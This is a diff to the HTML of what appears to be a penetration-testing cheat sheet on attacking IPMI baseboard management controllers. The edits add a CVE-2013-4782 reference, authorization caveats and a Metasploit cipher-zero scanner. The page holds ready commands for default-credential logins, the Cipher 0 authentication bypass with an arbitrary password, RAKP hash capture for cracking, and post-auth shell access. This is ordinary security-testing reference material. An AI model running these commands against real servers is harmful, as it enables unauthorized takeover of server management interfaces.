@@ -1265,10 +1265,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#cipher-0-auth-bypass" class="md-nav__link">
+  <a href="#cipher-0-auth-bypass-cve-2013-4782" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Cipher 0 Auth Bypass
+        Cipher 0 Auth Bypass (CVE-2013-4782)
       
     </span>
   </a>
@@ -5374,10 +5374,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#cipher-0-auth-bypass" class="md-nav__link">
+  <a href="#cipher-0-auth-bypass-cve-2013-4782" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Cipher 0 Auth Bypass
+        Cipher 0 Auth Bypass (CVE-2013-4782)
       
     </span>
   </a>
@@ -5418,7 +5418,7 @@
 <h1 id="ipmi-623">IPMI (623)<a class="headerlink" href="#ipmi-623" title="Permanent link">&para;</a></h1>
 <div class="admonition tip">
 <p class="admonition-title">Start here</p>
-<p>Dump IPMI hashes unauthenticated using Metasploit, this works against IPMI 2.0 without credentials. Crack offline with hashcat mode 7300. Default creds are also worth trying immediately: <code>admin:admin</code>, <code>ADMIN:ADMIN</code>, <code>root:calvin</code>.</p>
+<p>Fingerprint IPMI first, then test whether the BMC exposes an IPMI 2.0 RAKP challenge that can be captured for an identified user. Hashcat mode 7300 handles captured RAKP HMAC-SHA1 material.</p>
 </div>
 <hr />
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
@@ -5435,24 +5435,27 @@
 </code></pre></div>
 <hr />
 <h2 id="default-credentials">Default Credentials<a class="headerlink" href="#default-credentials" title="Permanent link">&para;</a></h2>
+<p>Test vendor defaults only after identifying the BMC vendor and confirming default-credential checks are authorized. For example, <code>root:calvin</code> is associated with Dell iDRAC rather than IPMI generally.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>admin<span class="w"> </span>chassis<span class="w"> </span>status
 </code></pre></div>
 <hr />
-<h2 id="cipher-0-auth-bypass">Cipher 0 Auth Bypass<a class="headerlink" href="#cipher-0-auth-bypass" title="Permanent link">&para;</a></h2>
-<p>IPMI 2.0 sometimes accepts authentication with Cipher 0, which allows any password.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-C<span class="w"> </span><span class="m">0</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span>ADMIN<span class="w"> </span>-P<span class="w"> </span>anything<span class="w"> </span>user<span class="w"> </span>list
+<h2 id="cipher-0-auth-bypass-cve-2013-4782">Cipher 0 Auth Bypass (CVE-2013-4782)<a class="headerlink" href="#cipher-0-auth-bypass-cve-2013-4782" title="Permanent link">&para;</a></h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4782">CVE-2013-4782</a> covers affected BMC implementations that accept Cipher 0 with an arbitrary password for a valid username. Confirm support with the Metasploit <code>auxiliary/scanner/ipmi/ipmi_cipher_zero</code> scanner before attempting privileged commands.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msfconsole
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>use<span class="w"> </span>auxiliary/scanner/ipmi/ipmi_cipher_zero
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="nv">$IP</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>run
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-C<span class="w"> </span><span class="m">0</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span>ADMIN<span class="w"> </span>-P<span class="w"> </span>anything<span class="w"> </span>user<span class="w"> </span>list
 </code></pre></div>
 <hr />
 <h2 id="post-auth-commands">Post-Auth Commands<a class="headerlink" href="#post-auth-commands" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-P<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>user<span class="w"> </span>list
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-P<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>sensor
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-P<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>sel<span class="w"> </span>list
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-P<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>shell
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>user<span class="w"> </span>list
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>sensor
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>sel<span class="w"> </span>list
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>ipmitool<span class="w"> </span>-I<span class="w"> </span>lanplus<span class="w"> </span>-H<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>shell
 </code></pre></div>
-<div class="admonition tip">
-<p class="admonition-title">Real-world</p>
-<p>IPMI is common on bare-metal server hardware (Dell iDRAC, HP iLO, Supermicro BMC). The <code>root:calvin</code> default is specific to Dell iDRAC and still works on plenty of unpatched systems. Hash dumps are particularly valuable here, even a cracked IPMI hash often reuses credentials on the host OS or other management interfaces.</p>
-</div>
+<p><code>-P</code> exposes the password in the process arguments. Prefer <code>-a</code> instead of <code>-P "$PASSWORD"</code> when an interactive password prompt is practical.</p>
 
 
 
